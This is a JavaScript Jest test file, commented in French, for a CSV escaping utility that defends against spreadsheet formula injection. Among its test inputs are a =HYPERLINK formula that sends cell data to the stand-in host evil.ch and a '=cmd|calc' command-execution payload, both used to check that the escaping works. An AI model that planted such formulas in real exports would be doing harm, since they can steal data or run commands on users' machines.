const { escapeCsvValue, toCsvRow, buildCsv } = require('../../utils/csv.utils');

describe('csv.utils — escapeCsvValue()', () => {
  test('laisse une valeur simple intacte', () => {
    expect(escapeCsvValue('julie@example.ch')).toBe('julie@example.ch');
  });

  test('renvoie une chaîne vide pour null / undefined', () => {
    expect(escapeCsvValue(null)).toBe('');
    expect(escapeCsvValue(undefined)).toBe('');
  });

  test('préfixe une apostrophe devant = + - @ (injection de formule)', () => {
    expect(escapeCsvValue('=1+1')).toBe("'=1+1");
    expect(escapeCsvValue('+FOO()')).toBe("'+FOO()");
    expect(escapeCsvValue('-2+3')).toBe("'-2+3");
    expect(escapeCsvValue('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  test('neutralise le classique =HYPERLINK exfiltration', () => {
    const payload = '=HYPERLINK("http://evil.ch?"&A1,"clic")';
    const out = escapeCsvValue(payload);
    // apostrophe ajoutée AVANT le = puis toute la valeur entourée de guillemets
    // (elle contient virgule + guillemets) → "'=HYPERLINK(...
    expect(out.startsWith('"\'=')).toBe(true);
    expect(out).toContain('""');
  });

  test('échappe les guillemets et entoure si virgule / retour ligne', () => {
    expect(escapeCsvValue('a,b')).toBe('"a,b"');
    expect(escapeCsvValue('dit "bonjour"')).toBe('"dit ""bonjour"""');
    expect(escapeCsvValue('ligne1\nligne2')).toBe('"ligne1\nligne2"');
  });

  test('gère un nombre', () => {
    expect(escapeCsvValue(42)).toBe('42');
  });
});

describe('csv.utils — buildCsv()', () => {
  test('génère un document avec BOM, en-tête et lignes', () => {
    const csv = buildCsv(['id', 'email'], [[1, 'a@b.ch'], [2, 'c@d.ch']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff); // BOM UTF-8
    expect(csv).toContain('id,email\r\n');
    expect(csv).toContain('1,a@b.ch\r\n');
    expect(csv.endsWith('\r\n')).toBe(true);
  });

  test('neutralise une valeur malveillante dans une cellule', () => {
    const csv = buildCsv(['email'], [['=cmd|calc']]);
    expect(csv).toContain("'=cmd|calc");
  });
});

describe('csv.utils — toCsvRow()', () => {
  test('assemble une ligne en échappant chaque cellule', () => {
    expect(toCsvRow(['a', 'b,c', '=d'])).toBe("a,\"b,c\",'=d");
  });
});
